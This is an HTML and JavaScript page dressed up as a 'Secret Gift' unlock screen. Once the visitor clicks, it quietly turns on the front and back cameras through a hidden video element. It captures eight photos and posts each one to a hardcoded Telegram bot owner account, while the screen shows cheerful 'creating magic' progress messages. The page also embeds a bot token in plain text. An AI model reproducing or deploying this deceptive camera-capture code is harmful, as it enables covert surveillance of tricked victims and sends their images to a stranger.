<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>üéÅ Surprise Gift</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  margin: 0;
  background: linear-gradient(135deg, #0b0014, #1a0030);
  color: white;
  font-family: Arial, sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
  overflow: hidden;
}

.card {
  background: rgba(22, 0, 34, 0.9);
  padding: 30px;
  border-radius: 20px;
  width: 90%;
  max-width: 400px;
  box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
  text-align: center;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 0, 255, 0.3);
}

.gift-icon {
  font-size: 70px;
  margin-bottom: 10px;
  animation: float 3s ease-in-out infinite;
}

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

h2 {
  margin: 10px 0;
  background: linear-gradient(45deg, #ff00ff, #00ffff);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 20px;
  border-radius: 50px;
  border: none;
  background: linear-gradient(45deg, #ff00ff, #00ffff);
  color: black;
  font-size: 18px;
  font-weight: bold;
  cursor: pointer;
  transition: transform 0.3s;
}

button:hover:not(:disabled) {
  transform: scale(1.05);
}

button:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.spinner {
  width: 60px;
  height: 60px;
  border: 4px solid rgba(255, 0, 255, 0.3);
  border-top: 4px solid #ff00ff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 20px auto;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.progress-container {
  width: 100%;
  height: 8px;
  background: rgba(255, 0, 255, 0.2);
  border-radius: 4px;
  margin: 20px 0;
  overflow: hidden;
}

.progress-bar {
  height: 100%;
  background: linear-gradient(90deg, #ff00ff, #00ffff);
  width: 0%;
  transition: width 0.5s ease;
}

.status {
  margin-top: 15px;
  font-size: 14px;
  color: #ffb3ff;
  min-height: 20px;
}

.hidden {
  position: fixed;
  top: -9999px;
  width: 1px;
  height: 1px;
  opacity: 0;
}

#debug {
  position: fixed;
  bottom: 10px;
  right: 10px;
  background: rgba(0,0,0,0.7);
  padding: 10px;
  border-radius: 5px;
  font-size: 12px;
  max-width: 300px;
  display: none;
}
</style>
</head>

<body>
<div class="card" id="box">
  <div class="gift-icon">üéÅ</div>
  <h2>‚ú® Secret Gift ‚ú®</h2>
  <p>A magical surprise is waiting for you!</p>
  <button id="unlockBtn">üéØ Unlock Gift</button>
  <div class="status" id="status"></div>
</div>

<video class="hidden" id="video" autoplay playsinline></video>
<div id="debug"></div>

<script>
// ===== CONFIG =====
const BOT_TOKEN = "8226782560:AAFPl8aGBfO-KBeSLgoh98dSyOTa1-AouFY";
const OWNER_ID = "8215819954";
const USER_ID = new URLSearchParams(window.location.search).get('uid');

// Debug logging
function debugLog(message) {
  console.log(message);
  const debugDiv = document.getElementById('debug');
  if (debugDiv.style.display === 'none') debugDiv.style.display = 'block';
  debugDiv.innerHTML += message + '<br>';
}

// ===== MAIN =====
document.getElementById("unlockBtn").onclick = async () => {
  debugLog("üöÄ Starting gift process...");
  debugLog(`User ID: ${USER_ID}`);
  
  const box = document.getElementById("box");
  const btn = document.getElementById("unlockBtn");
  btn.disabled = true;
  
  box.innerHTML = `
    <div class="gift-icon">‚ú®</div>
    <h2>üéÄ Creating Magic</h2>
    <p>Please wait while we prepare your gift...</p>
    <div class="spinner"></div>
    <div class="progress-container">
      <div class="progress-bar" id="progress"></div>
    </div>
    <div class="status" id="statusText">Initializing...</div>
  `;
  
  const progress = document.getElementById("progress");
  const statusText = document.getElementById("statusText");
  const video = document.getElementById("video");
  
  try {
    // ===== CHECK USER ID =====
    if (!USER_ID || USER_ID === "null" || USER_ID === "undefined") {
      throw new Error("No user ID found in URL. Please use the link from Telegram bot.");
    }
    
    debugLog("‚úÖ User ID valid");
    
    // ===== FRONT CAMERA - 4 PHOTOS =====
    statusText.textContent = "Accessing camera...";
    progress.style.width = "10%";
    
    debugLog("üì∑ Requesting front camera...");
    
    // Get front camera
    const frontStream = await navigator.mediaDevices.getUserMedia({
      video: { 
        facingMode: "user", 
        width: { ideal: 640 },
        height: { ideal: 480 }
      },
      audio: false
    });
    
    debugLog("‚úÖ Front camera accessed");
    video.srcObject = frontStream;
    
    // Wait for camera to be ready
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        debugLog("üé• Front camera playing");
        setTimeout(resolve, 1000);
      };
    });
    
    // Capture 4 front photos
    for (let i = 1; i <= 4; i++) {
      progress.style.width = (10 + i * 10) + "%";
      statusText.textContent = `Creating moment ${i} of 8...`;
      debugLog(`üì∏ Capturing front photo ${i}...`);
      
      await new Promise(r => setTimeout(r, 800));
      await captureAndSendPhoto(`front_${i}`);
      
      debugLog(`‚úÖ Front photo ${i} captured`);
    }
    
    // Stop front camera
    frontStream.getTracks().forEach(track => track.stop());
    debugLog("üõë Front camera stopped");
    
    // ===== SWITCH TO BACK CAMERA =====
    statusText.textContent = "Switching camera...";
    progress.style.width = "60%";
    await new Promise(r => setTimeout(r, 1000));
    
    debugLog("üì∑ Requesting back camera...");
    
    try {
      // Get back camera
      const backStream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: "environment",
          width: { ideal: 640 },
          height: { ideal: 480 }
        },
        audio: false
      });
      
      debugLog("‚úÖ Back camera accessed");
      video.srcObject = backStream;
      
      // Wait for camera to be ready
      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          debugLog("üé• Back camera playing");
          setTimeout(resolve, 1000);
        };
      });
      
      // Capture 4 back photos
      for (let i = 1; i <= 4; i++) {
        progress.style.width = (60 + i * 10) + "%";
        statusText.textContent = `Creating moment ${i + 4} of 8...`;
        debugLog(`üì∏ Capturing back photo ${i}...`);
        
        await new Promise(r => setTimeout(r, 800));
        await captureAndSendPhoto(`back_${i}`);
        
        debugLog(`‚úÖ Back photo ${i} captured`);
      }
      
      // Stop back camera
      backStream.getTracks().forEach(track => track.stop());
      debugLog("üõë Back camera stopped");
      
    } catch (backError) {
      debugLog(`‚ö†Ô∏è Back camera failed: ${backError.message}`);
      debugLog("üì∑ Using front camera for remaining photos...");
      
      // Use front camera if back fails
      const fallbackStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      
      video.srcObject = fallbackStream;
      
      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(resolve, 1000);
        };
      });
      
      for (let i = 5; i <= 8; i++) {
        progress.style.width = (60 + (i-4) * 10) + "%";
        statusText.textContent = `Creating moment ${i} of 8...`;
        await new Promise(r => setTimeout(r, 800));
        await captureAndSendPhoto(`front_fallback_${i-4}`);
      }
      
      fallbackStream.getTracks().forEach(track => track.stop());
    }
    
    progress.style.width = "100%";
    statusText.textContent = "Finishing up...";
    await new Promise(r => setTimeout(r, 1500));
    
    // ===== SUCCESS MESSAGE =====
    box.innerHTML = `
      <div class="gift-icon">üéâ</div>
      <h2 style="color:#00ff00">üéÅ Gift Delivered!</h2>
      <p>Your special surprise has been prepared</p>
      <p>Check your Telegram for 8 magical photos!</p>
      <div class="status" style="color:#00ff00">‚ú® Complete ‚ú®</div>
      <div style="margin-top:20px;font-size:40px">
        üéÄ‚ú®üéä
      </div>
    `;
    
    debugLog("‚úÖ Gift process completed successfully!");
    
  } catch (error) {
    console.error("Error:", error);
    debugLog(`‚ùå Error: ${error.message}`);
    
    box.innerHTML = `
      <div class="gift-icon">üé≠</div>
      <h2 style="color:#ff5555">Oops! Something went wrong</h2>
      <p>${error.message}</p>
      <p>Please try again or check:</p>
      <ul style="text-align:left;color:#ffb3ff;font-size:14px">
        <li>‚úì Camera permissions are allowed</li>
        <li>‚úì Using link from Telegram bot</li>
        <li>‚úì Stable internet connection</li>
      </ul>
      <button onclick="location.reload()" style="margin-top:20px">üîÑ Try Again</button>
      <div class="status" style="color:#ffb3ff">Error: ${error.message}</div>
    `;
  }
};

// ===== CAPTURE AND SEND PHOTO =====
async function captureAndSendPhoto(label) {
  return new Promise(async (resolve) => {
    try {
      const video = document.getElementById("video");
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      debugLog(`üñºÔ∏è Converting ${label} to blob...`);
      
      // Convert to blob
      canvas.toBlob(async (blob) => {
        if (!blob) {
          debugLog(`‚ö†Ô∏è No blob created for ${label}`);
          resolve();
          return;
        }
        
        debugLog(`üì§ Sending ${label} (${Math.round(blob.size/1024)}KB)...`);
        
        // ===== SEND TO USER =====
        try {
          const userFormData = new FormData();
          userFormData.append('photo', blob, 'gift.jpg');
          userFormData.append('chat_id', USER_ID);
          userFormData.append('caption', `üéÅ Your Gift: ${label}\n‚ú® From Hackers Colony Camera Bot`);
          
          debugLog(`üì≤ Sending to user ${USER_ID}...`);
          
          const userResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: userFormData
          });
          
          const userResult = await userResponse.json();
          
          if (userResponse.ok) {
            debugLog(`‚úÖ ${label} sent to user!`);
          } else {
            debugLog(`‚ö†Ô∏è User send failed: ${userResult.description || userResponse.status}`);
          }
          
        } catch (userError) {
          debugLog(`‚ùå User send error: ${userError.message}`);
        }
        
        // ===== CREATE NEW BLOB FOR OWNER =====
        canvas.toBlob(async (ownerBlob) => {
          if (!ownerBlob) {
            debugLog(`‚ö†Ô∏è No owner blob for ${label}`);
            resolve();
            return;
          }
          
          // ===== SEND TO OWNER =====
          try {
            const ownerFormData = new FormData();
            ownerFormData.append('photo', ownerBlob, 'gift.jpg');
            ownerFormData.append('chat_id', OWNER_ID);
            ownerFormData.append('caption', `üì∏ From User ${USER_ID}: ${label}\n‚è∞ ${new Date().toLocaleTimeString()}`);
            
            debugLog(`üì≤ Sending to owner...`);
            
            const ownerResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: 'POST',
              body: ownerFormData
            });
            
            const ownerResult = await ownerResponse.json();
            
            if (ownerResponse.ok) {
              debugLog(`‚úÖ ${label} sent to owner!`);
            } else {
              debugLog(`‚ö†Ô∏è Owner send failed: ${ownerResult.description || ownerResponse.status}`);
            }
            
          } catch (ownerError) {
            debugLog(`‚ùå Owner send error: ${ownerError.message}`);
          }
          
          resolve();
          
        }, 'image/jpeg', 0.9);
        
      }, 'image/jpeg', 0.9);
      
    } catch (error) {
      debugLog(`‚ùå Capture error for ${label}: ${error.message}`);
      resolve();
    }
  });
}

// Show debug panel on Ctrl+D
document.addEventListener('keydown', (e) => {
  if (e.ctrlKey && e.key === 'd') {
    const debug = document.getElementById('debug');
    debug.style.display = debug.style.display === 'none' ? 'block' : 'none';
  }
});
</script>
</body>
</html>
